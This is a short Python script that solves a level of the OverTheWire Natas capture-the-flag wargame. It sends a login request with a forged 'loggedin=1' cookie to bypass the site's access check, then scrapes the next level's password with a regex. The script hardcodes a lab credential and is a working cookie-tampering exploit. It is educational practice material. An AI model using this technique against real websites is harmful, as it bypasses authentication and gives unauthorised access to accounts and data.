#!/usr/bin/env python
# import the package requests which is for html information
import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

cookies = { "loggedin" : "1" }
# after using this object to re turn us with "cookie logged in = 0"
# the way this works is that 0 means not logged in, and when put = 1 means
# we ARE logged in, so making it a dictionary and typing in quotations
# = 1 we can log into the website

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.get(url,auth = (username, password), cookies = cookies)
content = response.text


# print(content)
# (.*)

print(re.findall("The password for natas6 is (.*)</div>", content)[0])